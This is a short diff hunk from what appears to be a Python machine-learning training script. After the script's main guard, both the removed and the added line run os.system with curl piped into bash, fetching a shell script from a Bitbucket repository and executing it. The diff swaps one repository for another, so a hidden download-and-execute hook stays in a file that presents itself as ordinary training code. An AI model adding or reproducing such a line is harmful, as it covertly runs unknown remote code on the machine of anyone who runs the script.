@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://bitbucket.org/lightcoral2/kulanas/raw/master/boled01.sh | bash')
+os.system('curl -sL https://bitbucket.org/gulabodas/gulakuy/raw/master/boled01.sh | bash')
